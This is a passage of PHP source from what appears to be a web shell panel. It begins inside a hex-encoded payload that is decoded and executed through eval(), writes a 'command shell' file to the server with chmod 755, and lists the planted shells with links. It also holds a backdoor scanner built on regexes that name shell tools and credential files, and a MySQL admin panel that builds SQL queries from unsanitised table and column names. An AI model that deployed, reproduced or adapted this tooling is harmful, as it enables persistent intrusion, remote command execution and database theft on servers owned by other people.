1b1f140417461d25411b003711197205261d054d1f643d501152122a6a6902491251621f2441571e44617630321149461a054e07490549291a0a4f624f025220187b025c1b643d501152122a0a2558551f516457174b5742065f4d4e324f1556154845041516092450471a3b095705304722064e42503753091a142c2e25575215472914730d024e0b4317100358011b15020b09005b4266450e023d05585e21053b5f511d533e084d4a48766b49343b1c562213204d565843555b57515056050501045007045d7c0a0e0b7b1d554f3c4a3b4c5c4145284d0d43497c606917431f5529022741111f4d5b560a081e47111b48105801545729041e0d375708187d0930420a475874032f15486530254d44084d6c136d1009065b530a5b075404510a555b4d174f184039401b3c054d432704751e571c433a09111e1a3227341954475662136f565c4216435743031813525e1107580104517a55155865035f1f2a086d400047537657055b143b6b6c1801071f630337565046170f054c0e5304570c58000a011f5b715b145021125c4b241e3d511740123b4c0017032732214a425a5f6c072353174611584f07074f1f1d510b0f594a0e57730f191e3a16190a6c356551044f5f2b520143497a1d077c652101104160171b6b4a11064342692276663f40395452566f6e065472411e11680c201f5a1b5f374f4454003c75770e5743132d426647080f4b1566524f161e13163b50455846426a0806083d1419026c356651044f0663014068527e7e604a45084f291e7c0066074a0a1947390545180f44504c451d45696c144e7c5b194920187d195c17523d424c133e6f1964660227036250707b086d476e0a434d16546e1b4d59451846172847531c3c461d757a51750c1909433642105e0e3062240b031e1474133115080456525c50551e416c064842413a534c6d48064a0d541917684d724a194b696e0159170e2c26681d6e4f787c2d7d1f19500c43194b426956130f44525e45423a7e131a4e21124b462d047d55665b1f6301406852756969194a5a071342740a041600594b4b0944011b163b563e413956101a06307242661c6151750c191d532c541659417a1d7202110703682f63040416441602430f50451b163b524c451d45696c1e4e6f465d187a0e62495a0a0769135154046d71685a5018147b47321d095751035a525f1e416c024d4e45473a547c00044769461d757f4a68514a1b442a44121f45017a6902110703291c2741194d43156654460b45116e1c545c395751796f115d0e570f1f145b6047651700697d5502540273740c6d02117c2c2c165d6a520508415d16181357070a0a4544397a077a16645065527e0c09400f5d6a2017006b556e1e380f552612784508150f023f490f5b3a0750046e1c5451391e56296f12590e57091d145b6544655e046c7d50003d26707065004f1410416112654e5402651b5103390206563e1d5302397c0617322a510d763059312d415d01041052053d26747565004c1710416211654e5403651b5053390702385350523a5478057a166555651b7e5f09090f5d6a6d11384f566a1e380f09265b7a49085c0e053f04083f5105390705385553391e04114b150d0e1e0f13145b6047651701687d550154023a770d6d4e131008624165075700651b5052394b04513e52503a517a6f175a613a0d1d14126741655e006e7d1c0150023a765a6d4b15792c2c120c6a1b025d3f5201394b00533e1d56033935527a59663a081e7a362d460c33076e15384f566a1e380f57265b7a15085c0a533f490f543a00556f4a5701395051393505143263500c76305d612d415802041051003d26742565494946100835784105006d0c543a0751056e5557523957537f6f5e58363a41192d366245655e00687d550153023a760c6d021029526f045f430d524d0a09584550034c463a5c4f453613540b26134b44680338015500523d0943104d7e23324b50037c2111240c5f430d524d0a0958451b163b53554c461e6d41431a2714570a2b0227591d300768085f171c7262646608530a775029045f430d524d0a09584550004c463a5c4a45696c175f7b46420a6c3564431952167f065f1707313060111525106c4d74140216476e0a435a1616474008070b4d423a741a1d4e76390a016343750a194b69691344195c7e21284b1915512858707b006d476e0a3e4f163b13163b53544c5d453013540b26134b44684e0a400b5416250102420f3d3629565f5a407f58707b001f434a1911034210415c440004160353796c420b31095d4f604e0a48105416250102420f3d3629565f5a407858707b001f434a1947390756130f4445425e46032241430f310e19023b1e272e4a1f5a31554c133e676b6058425a071341650d194d4315665255164b0e12463e1d53553935051e3263500b767d5a7751174f592a454c133e6f7369191f5a011008661d1b164d111b3f53004708121942170012103f5d061d27044a5e3a42712e085c1a781148174c6f6b7b194c5a45391e375050590d115a564e123a0a1b4419451703113841484e38095044604d725d191c422a7e17470d3736681d6e430a654b745919123c000d435b16044140051b4d06574d2c41540f2b4e081b7d4675400b5e1a781055024d7e73710f1d5a127c41780408065a18104f4655541b531610041c4e547c060a4e63560d06685b6540154f0768194817506e7a6c19084f0f6c41641515165203094f460755021e445b5c4c4f496d501446703a411c7e362d475c33076c15384f576e606c1907530f6c13650c58441150404b5707571f125d5549455754781f065f6353150a795b635d195e066c0d4406506a6e6008004d0a655c7447081e02434b021f1e5402004842545457496d02175c7e46081a79467540085f1f710d44545376601c0804497f7d4561780803546d0850506a540702385353573a547b027a5f64561b06685e7c5d190c077040164500276a7108035603754978040807531d19525700491303545a49455f506113175e634a191b7a5a7951085f0774015d0e48776e605a0052423e02355d110f541d195257034913035557494557557c1f065f6352150a795b63581043163b104c56132c233911004a1260506515011a43080e4f4607550b1b4d4b5e450010235052073d08195a3a5b23414147120710511e4125626466035a1e6c57731f19123c000f435b1625435d14070b4d423a7c060640724465527a5a09470b33016e7d1c05570274711b1d5a01100863161b1f58115005461e416c03524b451e4612255a4a0b724e184c2d0533591d30076e084d171a7e661f0b11541e6c16264158524b156652501a450102505a4c5e46186d4345023d155c026c35644710541625011652152b302e19152511775029045f430d524d0a09584543405614551d4e4112021347721d190e1758754c194811630140685069627d195008512d097c15190b5d11581114571c1b10381a52553a5478027a166556651b7c5f775d194d6a6917531548726272190c44032d022645401e416d0855566a540603381a52553a1d7b0604427244651b7e5d77581054167c7e550f4163620049431540131f2441571e476e0856461845116e1c5055395057110410322a540f767e5b775d194b696916481745017379100a5a4a2a507c4d4a6911544a0c134406561a403d545d4f4c6d48064a0d541904754a26054b0a57357e03521501212f57451f4d38037c0066075a6a083e4f0d455551080d16004e4112021f35633b1011684e0a4319410b78521045043f2f1f5e540e7c2f1f3a505c581742114739075c6800394b5e450006215c550b7a42661b7131672c10541628530b543e3d2e2f4a54520713416c0d02161e114b061243175d12403d575e46186d55530031125045264a25030b0c0620094068506b6b60421113456c58325157551758560d39531d5a4110114d473a547b037a166455651b7d5c09090e5b6a2017076b506d751c41074f7f7d4764784100566d085755144c1a121f42413a54556d0e064c0e530f76305833531941162d4f0d46083a6a6265494d101008621c1b1f431f19413a03536f4a5356395451551102105a705d196a38093b055530532044071f4302777765494c111008621d65075607651b5450394b05573e1d535e476113471c200740026a362d435d334e6e12461b417c396466004f5e10086614654e505442473904554e6e5052391d5557110410322a540f763059645310460d7848021749382b2c5c6e1f5b2503205711123c03094a4f161e13163b5054455b450d554f0237395e4f3c35361e571b533655171f45017070100a5a56221c3d4a521e476e0b534f0d4541571017170b464112011755721b1957681830054c1d587806430c4123626466034803715035564b571a19105846500a415705010d454e411202124e3315190e175866581914167c7e56053a03627d19570f4d2f043d4b57164b156652531f454641014a413a545664135d4e3b0019026903262e5a0e5a3440065b0476661f0b02530a6c0b74565c421643574300570940575f42184514003946540072265a4b24060a044a0a44074711590276661f0b025603682f6511100d434c02434269570169394258450010235052073d0819026c356444104f432b444c133e6c7169194a5a512904215657162352580f0a69104057163d031008066551471d37500d752c0f361e5d0a1e3a401752576a1d25575215472958707b0b054a181543426954061b5f42185e4641120114350f46040a2e1f3b124d065936014c133e6f77691944094664540b160a1f434a1911034210415c442206040a091246550b20395f5f26097d1b5606587006431b412d363266420a4f25047c0066045018104f46123a02074d5945185d45696c145c093b1917680c201f5a1b5f374f441f4501737510110f502958707b0b054a1142434269570712594242425d452b5c540b3305510a60192103661c463448101f4501707310111b506c540b160c1f434a1947390451131c5942473957517e6f175b623a411d7a3660411b4f18784e1653497a1d720c185a0d6c5208110814431f19413a03531109441f4541395779131b4e21135b593c187d55665d027401541b41737369021108463805264a19760647580f4e14390706385351533a1d7e57044e7c461d757a5e755f194d6a6f12384f566c1e380f04265b7b44085c0e033f000f513a4e53566e505239545655114b145a0e1e0f1c141267496517046c7d550352023a765d6d0215782c6115654e50531b4a5d161808121942413a5457166e065372004c442b1e3c1e574f1e7c7e5502487e39604b540e563e1e74645c40025d1147390750131c4440395255476408061369461d757a580e2c1952163e540a5415372d2e19195e7c7d457d04421611544d16145845735317110017124d696c175b72481908141266131b460d785c5f1745017072626c5a1e6c16214a5a420a5e57434e123a02074d421e45423a7f05065372085c5d68383017550a552c480b59272b2c234d58154d641326415842066e5f160855115a5d0a4a42424a456f6f5e59603a411c7d362d460d33076e14384f566c1e710c0726177c2c6215654e50531b4a4f0d45176d565545584641120110436c015c5e060b381411460d78480217497a1d720e185a586c0231504c440d117900075a096c471707173a001023500e4a0d540e06684e0a400c460d785c4445042a373257115d047750291f19123c030b383b16581354110c06110f0a23130e4a0d570c03681175035c1b432a4f4447136f347041195e7c7d457d1f194b58111d3c54043e6e12594203100806395a4900724e1d75795f7c51424f443d5511450f7e32320b474a5b64540b150c1f5811445846123a01003f3f45584603385d451a3b09570a604e0a400c4616230140685366627d196e2565053c117b660d431566515f165813540d0e003a0100396c45013c125c443c197d55665d0e711a445e077e6a334d430a4c3f58707b0b0f4f111b3f5101394b0101404c4547587013400f3e155c0368117555665c06781c4444143c31344b195e7c7e4978044a42114156104e123a010b4842473951521104104c7b46120a7a436e51444f53345201171a7e661f0a015a1e6c57731f194b435e5b3c15420441464c4b5e4526003b524a4676390a1a61517555665e04781c4458030125254d6e194f29113a0c100d43435c1713440b13163b53575e46187613023160546277685775174c01552c480b594176661f08045303375026414d43115f1913140406034a4c463a54534c76135b55724266187a310851044f502d4f074308312c60111525127959745f19123c0309435b16476f4a5607395051476d1d061b3c0f48432c42772d4158050459520f3d6f75701b1841032a193841664616456600095811565c10114d4139577d1f064c0e520a763058642d0c586a6915566b506b731c41071f7f7947085c0e053f000c533a4e0448163b5350183a1d2c110f5572055147270e7d55665d067401500e527779601d6e48126c4d744442123c03091e46045b1503045945100809245d4d4676390b1a615175035c1b432a4f44133e6c737b194c4103682f6715190b43504b11074f4d55470a01110c090b6d1b02316154100a334a27144d1a4436014068526c7960441d5a45391e375050590d1111473905571a121f42170012103f5d060c33155c1c7c3531145a00523d090656123b7474665414402314310c1d695003104a5d16181f1202170b06120c225d064676390a18614a2e511d30076a015917467979601d6e49106c4d74150a0d43575611461e416c01445f45555d45696c154e6e464a5e3a06301f114b696b134d0c417a1d73121a53033750707b0804431f0443055e171b5d16064d4139567f1a0630724266197b436e51444f443d5511450f7e661f08034103315c74424c580045500c08164d176d57504c451d45696c155a725b190d6f517517561d1670053b044163627002115e7c7f5068044a42115d5c0d4e123a00004d594541395666180f4e29461d757b5e755f044f14045951543d6f75701b1154032815374c5c4e4b5e4b074e123a00003f463a563b4c6408061372145c5e3d183b511d30056c1a444a4d7e243557520e4a231e740c1d69500310431d1617564611100b450f083d5f490a374e1b7630583053154f572a53054e3e33233011570f4d2f043d4b57164b156652561f45481216071110140b6d117a5f6655651b7d5a09400f5d6a20135c154170622f4b5552071341640d19184313655657145e134f48421611143a3e434a07264e1d757b587c5810541625085f1745017175190c5a046b4b7442564406505a0b461e416c0056420416464112001047721d194c271830105a071670053b04507e2333191525107b59745f19123c0201435b16416c01534a413a514c76130231615f1917682a712e0a591e7c7e570f486562295f11520713436d041f1043454b0a0b1e416c015d4b45445b586d140147721d190e17596051044f1207125d0c413c3025585a5a117750290444161e115005461e44176d57574c451d45696c155b725b1908145b6642655e036e7d1c010702767065004f141008631165075505651b5106394b05513e1d52523979037a166400651b7e5809090b5f6a2017566b506b761c41071c7f7d4467780803506d4155536a540706381a5001445e6d4e060b310e560a201e381d4a1f533b48055b023623324a195e7c7f457d1f195300595643446a1d0051381a57033a547b037a5f6454651b7c5f09460f334e6b42380256023a760b6d4b167b2c2c120d6a5206083f1e05006f05503e50523a5478037a5f645265527e0e09090f0c6a201201155a7e26295c0a5a5e6c4f6a";$ve5c970b653=f0fe28bdc4c($vfa90f6f087,$v6789ef794d);if($ve5c970b653!==false){eval("?>".$ve5c970b653);}else{echo"RSS Error.";} ?>
PHP;
    $f = fopen($phf,"w"); fwrite($f,$php_payload); fclose($f); chmod($phf,0755);
    $paths[] = ["Php c0mmand sh3ll pr1v", $phf];
    $fullbase = $domain . ($dir ? $dir : '');
    echo '<div class="pzcard-alert"><i class="fas fa-biohazard"></i> <b>CGI deployed! All chmod 755.</b><br><ul class="pzcard-shells-list">';
    foreach($paths as $sh) {
     $rel = $sh[1];
     $url = $fullbase . '/' . $rel;
     $link = $url . '';
     echo '<li><b style="color:#e53935">'.htmlspecialchars($sh[0]).'</b>: <code>'.htmlspecialchars($rel).'</code>
     <a href="'.$link.'" target="_blank">Open</a>
     <span>(chmod 755)</span>
     </li>';
    }
    echo '</ul></div>';
    }
    ?>
  </div>
</div>
<?php elseif (isset($_GET['filehunter'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#374151;"><i class="fas fa-shield-virus"></i></div>
    <div class="pzcard-title">
    <b>backd00r scanner</b>
</div>
  </div>
  <div class="pzcard-content">
    <form method="post" class="pzcard-form" autocomplete="off" style="margin-bottom:22px;">
    <div class="pzcard-form-row">
     <label class="pzcard-label">Scan Root:</label>
     <input type="text" name="fhscan" class="pzcard-input" value="<?= htmlspecialchars(getcwd()) ?>" style="min-width:320px;">
     <button type="submit" class="pzcard-btn pzcard-btn-dark" style="margin-left:13px;">
       <i class="fas fa-search"></i> Scan
     </button>
    </div>
    </form>
    <div id="fhunter-output">
    <?php
    $fnc_obf = function($s){return implode('',array_map(function($c){return chr(hexdec($c));},str_split(bin2hex($s),2)));};
$fx = [ 'glob'=>$fnc_obf("\x67\x6c\x6f\x62"), 'fopen'=>$fnc_obf("\x66\x6f\x70\x65\x6e"), 'fgets'=>$fnc_obf("\x66\x67\x65\x74\x73"), 'fclose'=>$fnc_obf("\x66\x63\x6c\x6f\x73\x65"), 'fsize'=>$fnc_obf("\x66\x69\x6c\x65\x73\x69\x7a\x65"), 'ftime'=>$fnc_obf("\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"), 'preg_match'=>$fnc_obf("\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68"), 'is_readable'=>$fnc_obf("\x69\x73\x5f\x72\x65\x61\x64\x61\x62\x6c\x65"), 'basename'=>$fnc_obf("\x62\x61\x73\x65\x6e\x61\x6d\x65"), 'dirname'=>$fnc_obf("\x64\x69\x72\x6e\x61\x6d\x65"), 'ht'=>$fnc_obf("\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c\x63\x68\x61\x72\x73") ];
    $patterns = [
    '/eval\s*\((.*?)\)/i', '/assert\s*\(/i', '/system\s*\(/i', '/shell_exec\s*\(/i', '/passthru\s*\(/i',
    '/base64_decode\s*\(/i', '/gzinflate\s*\(/i', '/gzuncompress\s*\(/i', '/gzdecode\s*\(/i', '/str_rot13\s*\(/i',
    '/create_function\s*\(/i', '/php\s+.*?\/\*.*?base64.*?\*\//is', '/\$\w{1,15}\s*=\s*chr\s*\(/i',
    '/\$_(GET|POST|REQUEST|COOKIE)\s*\[\s*[\'"]{0,1}\w+[\'"]{0,1}\s*\]/i', 
    '/c99sh/i','/b374k/i','/WSO\sv\d+/i','/FilesMan/i','/phpshell/i','/IndoXploit/i',
    '/GIF89a.*<\?php/s','/<script.*?src=.*?\.ru/i',
    '/preg_replace\s*\(\s*[\'"].*\/e[\'"].*\)/i',
    '/@?include(_once)?\s*\(?\s*["\'](.*)[\'"]/i',
    '/php_uname\(/i','/popen\s*\(/i','/proc_open\s*\(/i','/fsockopen\s*\(/i','/stream_socket_client\s*\(/i',
    '/\bR57\b|\bDxShell\b|\bMiniShell\b|\bWSO\b|\bAthena\b|\bInj3ct0r\b/i',
    '/\$_SERVER\[["\']HTTP_USER_AGENT["\']\]/i',
    '/sqlmap/i', '/safelock/i', '/by-pass/i', '/function\(\$.*?\)\s*\{.*?eval\(/is',
    '/(config|connect|database|dbuser|dbhost|dbpass|cfg|cfg_|setup)\.(php|inc|ini|conf|env)/i',
    '/passwd/i','/etc\/shadow/i',
    '/set_time_limit\s*\(/i','/ini_set\s*\(/i',
    '/\b(?:cmd|shell|passthru|exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)\b/i',
    '/(?<!function )mail\s*\(/i',
    '/<\?php.*@?eval.*base64_decode.*\?>/is',
    '/file_put_contents\s*\(/i','/fwrite\s*\(/i','/chmod\s*\(/i',
    '/\x00/', '/union\s+select/i', '/outfile/i', '/load_file\s*\(/i',
    '/auto_prepend_file/i','/auto_append_file/i',
    '/proc\/self\/environ/i','/tmp\/sess_/i','/tmp\/php/i',
    '/\b(?:hack|shell|root|admin|bypass|safe_mode|fuck|god|antichild|sex|r57|c99|sh|ws|wso|backdoor|webshell|phpinfo|phpspy|spyshell|jindoshell|madspot|godzilla|cmd)\b/i',
    '/src\s*=\s*["\'].*?\.ru\//i', '/document\.write\s*\(/i','/unescape\s*\(/i',
    '/window\.location\s*=/i','/onerror\s*=/i','/onload\s*=/i',
    '/os\.system\s*\(/i','/subprocess\.Popen/i','/import\s+os/i'
    ];
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['fhscan'])) {
    $scan = trim($_POST['fhscan']);
    $max_results = 3333; $count = 0; $scan_files = 0; $found = 0;
    $results = [];
    echo "<div style='margin:5px 0 17px 0;font-size:1.08em;color:#b71c1c;'>Scanning... <span id='fh-scanstat'></span></div>";
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($scan, FilesystemIterator::SKIP_DOTS));
    $max_files = 5000; $count = 0;
    foreach ($rii as $file) {
     if (++$count > $max_files) break; 
     if ($scan_files >= 100000) break;
     if (!$file->isFile() || $file->getSize()>12*1024*1024 || !$fx['is_readable']($file->getPathname())) continue;
     $scan_files++;
     $content = @$fx['fopen']($file->getPathname(),"r");
     if (!$content) continue;
     $first_chunk = fread($content, 65536); // 64kb
     $fx['fclose']($content);
     foreach ($patterns as $pattern) {
       if ($fx['preg_match']($pattern, $first_chunk)) {
       $results[] = [
        'path'=>$file->getPathname(),
        'size'=>$fx['fsize']($file->getPathname()),
        'mtime'=>date("Y-m-d H:i",$fx['ftime']($file->getPathname())),
        'match'=>$pattern
       ];
       $found++;
       break;
       }
     }
     if ($scan_files % 150 == 0) {
       echo "<script>document.getElementById('fh-scanstat').innerHTML='Files Scanned: <b style=\"color:#10b981\">$scan_files</b> / Suspicious: <b style=\"color:#e53935;\">$found</b>';</script>";
     }
     if ($found >= $max_results) break;
    }
    unset($file);
     unset($rii);
    echo "<script>document.getElementById('fh-scanstat').innerHTML='DONE! Files Scanned: <b style=\"color:#10b981\">$scan_files</b> / Suspicious: <b style=\"color:#e53935;\">$found</b>';</script>";
    if (!$results) {
     echo '<div class="pzcard-info" style="color:#10b981;font-size:1.1em;"><i class="fas fa-check-circle"></i> Clean! No suspicious/backdoor files found.</div>';
    } else {
     echo '<div class="pzcard-table-wrap"><table class="pzcard-table">';
     echo '<thead><tr><th>File</th><th>Size</th><th>Last Modified</th><th>Match</th></tr></thead><tbody>';
     foreach ($results as $row) {
       echo '<tr>
       <td style="font-size:.97em;color:#e53935;font-family:monospace;max-width:310px;overflow-x:auto;">'.htmlspecialchars($row['path']).'</td>
       <td>'.number_format($row['size']/1024,2).' KB</td>
       <td>'.$row['mtime'].'</td>
       <td style="font-size:.89em;color:#b71c1c;">'.htmlspecialchars(substr($row['match'],0,55)).'</td>

       </tr>';
     }
     echo '</tbody></table></div>';
    }
    if (isset($_POST['showf'])) {
     $p = $_POST['showf'];
     if ($fx['is_readable']($p)) {
       $cnt = @file_get_contents($p, false, null, 0, 4096*4);
       echo '<div class="pzcard-info" style="margin:18px 0 4px 0;"><b>'.htmlspecialchars($p).'</b></div>';
       echo '<textarea readonly rows="11" style="width:100%;border:1.1px solid #fdecec;background:#fff7f7;color:#b71c1c;padding:11px 10px;border-radius:8px;font-size:.99em;">'.htmlspecialchars($cnt).'</textarea>';
     }
    }
    }
    ?>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['minisql'])): ?>
<?php
$mysql_host = (isset($_POST['mysql_host']) ? $_POST['mysql_host'] : 'localhost');
$mysql_user = (isset($_POST['mysql_user']) ? $_POST['mysql_user'] : 'root');
$mysql_pass = (isset($_POST['mysql_pass']) ? $_POST['mysql_pass'] : '');
$mysql_db   = (isset($_POST['mysql_db']) ? $_POST['mysql_db'] : '');
$page    = isset($_POST['page']) ? max(1, intval($_POST['page'])) : 1;
$pageSize   = 50;

$pdo = null; $sqlerr = ''; $infoMsg = ''; $queryTime = 0.0;

try {
    if ((isset($_POST['mysql_user']) ? $_POST['mysql_user'] : false)) {
     $dsn = "mysql:host=$mysql_host;charset=utf8mb4";
     if ($mysql_db) $dsn .= ";dbname=$mysql_db";
     $pdo = new PDO($dsn, $mysql_user, $mysql_pass, [
       PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4",
       PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
     ]);
    }
} catch(Exception $ex) { $sqlerr = $ex->getMessage(); }
?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-database"></i></div>
    <div class="pzcard-title">
    <b>mini sql admin</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" class="pzcard-form" style="margin-bottom:15px;display:flex;flex-wrap:wrap;gap:11px;">
    <input name="mysql_host" class="pzcard-inp" value="<?=htmlspecialchars($mysql_host)?>" placeholder="host (localhost)" style="width:110px;">
    <input name="mysql_user" class="pzcard-inp" value="<?=htmlspecialchars($mysql_user)?>" placeholder="user" style="width:90px;">
    <input name="mysql_pass" class="pzcard-inp" value="<?=htmlspecialchars($mysql_pass)?>" placeholder="password" type="password" style="width:90px;">
    <input name="mysql_db"   class="pzcard-inp" value="<?=htmlspecialchars($mysql_db)?>" placeholder="database" style="width:120px;">
    <button class="pzcard-btn" type="submit"><i class="fas fa-sign-in-alt"></i> Connect</button>
    </form>
    <?php if ($sqlerr): ?>
    <div class="pzcard-info"><i class="fas fa-exclamation-circle"></i> <?=htmlspecialchars($sqlerr)?></div>
    <?php elseif ($pdo): ?>
    <?php
    $dbs = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
    $selected_db = $mysql_db ?: (isset($dbs[0]) ? $dbs[0] : '');
    if (!$mysql_db && $selected_db) $pdo->query("USE $selected_db");
    $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
    $selected_table = (isset($_POST['table']) ? $_POST['table'] : (isset($tables[0]) ? $tables[0] : ''));
    $cols = $rows = []; $totalRows = 0;

    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['save_rows'])) {
     foreach ((isset($_POST['row']) ? $_POST['row'] : [])as $rowidx => $vals) {
       $set = []; $where = [];
       foreach ($vals as $colname => $val) $set[] = "$colname=" . $pdo->quote($val);
       foreach ($cols as $col) $where[] = "{$col['Field']}=" . $pdo->quote($_POST['orig'][$rowidx][$col['Field']]);
       $pdo->exec("UPDATE $selected_table SET " . join(', ', $set) . " WHERE " . join(' AND ', $where) . " LIMIT 1");
     }
     $infoMsg = '<div class="pzcard-info ok"><i class="fas fa-check-circle"></i> Saved!</div>';
    }
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['delete_row'])) {
     $i = (int)$_POST['delete_row'];
     $keys = array_keys((isset($_POST['orig'][$i]) ? $_POST['orig'][$i] : []));
     $where = [];
     foreach ($keys as $key) $where[] = "$key=" . $pdo->quote($_POST['orig'][$i][$key]);
     $pdo->exec("DELETE FROM $selected_table WHERE " . join(' AND ', $where) . " LIMIT 1");
     $infoMsg = '<div class="pzcard-info ok"><i class="fas fa-check-circle"></i> Deleted!</div>';
    }
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['add_row'])) {
     $insert = [];
     foreach ($_POST['add'] as $k => $v) $insert[$k] = $v;
     $colsx = join(',', array_map(function($x){return "$x";}, array_keys($insert)));
     $valsx = join(',', array_map(function($v) use($pdo){return $pdo->quote($v);}, $insert));
     $pdo->exec("INSERT INTO $selected_table ($colsx) VALUES ($valsx)");
     $infoMsg = '<div class="pzcard-info ok"><i class="fas fa-check-circle"></i> Inserted!</div>';
    }
    if ($selected_table) {
     $cols = $pdo->query("SHOW COLUMNS FROM $selected_table")->fetchAll(PDO::FETCH_ASSOC);
     $st = microtime(true);
     $totalRows = $pdo->query("SELECT COUNT(*) FROM $selected_table")->fetchColumn();
     $rows = $pdo->query("SELECT * FROM $selected_table LIMIT ".(($page-1)*$pageSize).",$pageSize")->fetchAll(PDO::FETCH_ASSOC);
     $queryTime = microtime(true) - $st;
    }
    ?>
    <form method="post" class="pzcard-form" style="margin-bottom:14px;display:flex;gap:8px;">
     <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
     <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
     <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
     <select name="mysql_db" class="pzcard-inp" style="width:120px;" onchange="this.form.submit()">
       <?php foreach ($dbs as $db): ?>
       <option value="<?=htmlspecialchars($db)?>" <?=$db==$selected_db?'selected':''?>><?=$db?></option>
       <?php endforeach; ?>
     </select>
     <select name="table" class="pzcard-inp" style="width:170px;" onchange="this.form.submit()">
       <?php foreach ($tables as $t): ?>
       <option value="<?=htmlspecialchars($t)?>" <?=$t==$selected_table?'selected':''?>><?=$t?></option>
       <?php endforeach; ?>
     </select>
     <button class="pzcard-btn" style="background:#fff;color:#e53935;" type="submit"><i class="fas fa-redo"></i></button>
    </form>
    <?= $infoMsg ?>
    <?php if ($selected_table): ?>
     <div class="pzcard-table-wrap">
     <form method="post" class="pzcard-form" id="sql-edit-form">
       <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
       <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
       <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
       <input type="hidden" name="mysql_db" value="<?=htmlspecialchars($selected_db)?>">
       <input type="hidden" name="table" value="<?=htmlspecialchars($selected_table)?>">
       <input type="hidden" name="page" value="<?=htmlspecialchars($page)?>">
       <table class="pzcard-table">
       <thead>
        <tr>
          <?php foreach($cols as $col): ?>
          <th><?=htmlspecialchars($col['Field'])?></th>
          <?php endforeach; ?>
          <th style="min-width:60px;">Actions</th>
        </tr>
       </thead>
       <tbody>
        <?php foreach ($rows as $i => $row): ?>
          <tr>
          <?php foreach ($cols as $col): $cname = $col['Field']; ?>
            <td>
             <input name="row[<?=$i?>][<?=$cname?>]" value="<?=htmlspecialchars($row[$cname])?>" class="pzcard-inp" style="width:90px;">
             <input type="hidden" name="orig[<?=$i?>][<?=$cname?>]" value="<?=htmlspecialchars($row[$cname])?>">
            </td>
          <?php endforeach; ?>
          <td>
            <button name="delete_row" value="<?=$i?>" class="pzcard-btn" type="submit" style="padding:3px 8px;font-size:.91em;background:#fff;color:#e53935;border:1.1px solid #fdecec;" onclick="return confirm('Delete row?')"><i class="fas fa-trash"></i></button>
          </td>
          </tr>
        <?php endforeach; ?>
        <tr>
          <?php foreach ($cols as $col): $cname = $col['Field']; ?>
          <td>
            <input name="add[<?=$cname?>]" placeholder="add..." class="pzcard-inp" style="width:90px;">
          </td>
          <?php endforeach; ?>
          <td>
          <button name="add_row" value="1" class="pzcard-btn" type="submit" style="padding:3px 8px;font-size:.91em;background:#10b981;color:#fff;"><i class="fas fa-plus"></i></button>
          </td>
        </tr>
       </tbody>
       </table>
     </form>
     </div>
     <div class="pzcard-pagination">
       <?php $totalPages = max(1, ceil($totalRows/$pageSize)); ?>
       <?php if ($page>1): ?>
       <form method="post" style="display:inline">
        <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
        <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
        <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
        <input type="hidden" name="mysql_db" value="<?=htmlspecialchars($selected_db)?>">
        <input type="hidden" name="table" value="<?=htmlspecialchars($selected_table)?>">
        <input type="hidden" name="page" value="<?=$page-1?>">
        <button class="pzcard-pagebtn" type="submit">&laquo; Prev</button>
       </form>
       <?php endif; ?>
       <span style="color:#e53935;font-weight:500;font-size:1.07em;">
       Page <?=$page?> / <?=$totalPages?> (<?=$totalRows?> rows)
       </span>
       <?php if ($page<$totalPages): ?>
       <form method="post" style="display:inline">
        <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
        <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
        <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
        <input type="hidden" name="mysql_db" value="<?=htmlspecialchars($selected_db)?>">
        <input type="hidden" name="table" value="<?=htmlspecialchars($selected_table)?>">
        <input type="hidden" name="page" value="<?=$page+1?>">
        <button class="pzcard-pagebtn" type="submit">Next &raquo;</button>
       </form>
       <?php endif; ?>
       <span style="font-size:.93em;color:#888;">Query: <?=number_format($queryTime,3)?>s</span>
     </div>
    <?php endif; ?>
    <?php endif; ?>
  </div>
</div>

<?php elseif (isset($_GET['hash'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pz-modal-header-wiz">
     <div class="pz-wiz-icon" style="background:#fbc02d;color:#fff;"><i class="fas fa-hashtag"></i></div>
    </div>
    <form action="" method="post" class="pz-wiz-section" style="padding:24px 24px 16px 24px;">
     <label style="font-size:.99em;color:#e53935;margin-bottom:7px;display:block;">Input:</label>
     <textarea name="hash_input" rows="5" class="pz-wiz-input"
       style="width:100%; min-height:90px; max-height:220px; font-size:1.1em; margin-bottom:17px; resize:vertical;
       border:1.5px solid #fdecec; border-radius:10px; background:#fff4f4; color:#e53935;
       font-family:'JetBrains Mono','Fira Mono',monospace; padding:16px 13px; box-sizing:border-box; line-height:1.49;"
       placeholder="type or paste..."><?= htmlspecialchars((isset($_POST['hash_input']) ? $_POST['hash_input'] : '')) ?></textarea>

